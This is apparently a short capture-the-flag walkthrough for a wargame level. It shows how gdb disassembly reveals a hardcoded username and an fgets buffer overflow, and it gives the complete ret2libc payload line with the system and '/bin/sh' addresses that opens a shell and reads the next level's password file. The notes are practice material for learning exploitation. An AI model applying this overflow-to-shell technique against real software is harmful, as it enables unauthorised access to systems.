start ssh connection with ssh -p 4242 level01@127.0.0.1

use flag from level00

start the level01 file wtth gdb

disas main

disas verify_user_name

focus attention on cmp function where the user_name is checked - it is dat_wil, we have it

disas verify_user_pass

we can see that no matter what is the outcome we end with falure but fgets is able to input 100 symbols while buffer has only 16 - we can overflow it

https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/ for finding an offset with breakpoints before and after the second fgets

with 100 letters entered we get a segFault at 80s offset

we need to: set a system function pointer at return pointer of the stack, enter anything at the frame pointer, set the first local variable of the callee to /bin/sh

info proc map -> find 0xf7e2c000, 0xf7fd0000, "bin/sh" (libc functions) to find "bin/sh string address

info function system to find system function address

found out that we have a space available for file saving at /tmp/ and python 2.7.3 installed

python -c 'print "dat_wil\n"+"U"*80+"\xd0\xae\xe6\xf7"+"4242"+"\xec\x97\xf8\xf7"' > /tmp/tmp to cunstruct a payload - little endian for addresses

cat /tmp/tmp /dev/stdin | ./level01 to input a payload, we add stdin to be able to continue work

go to the level02 folder and check flag in .pass
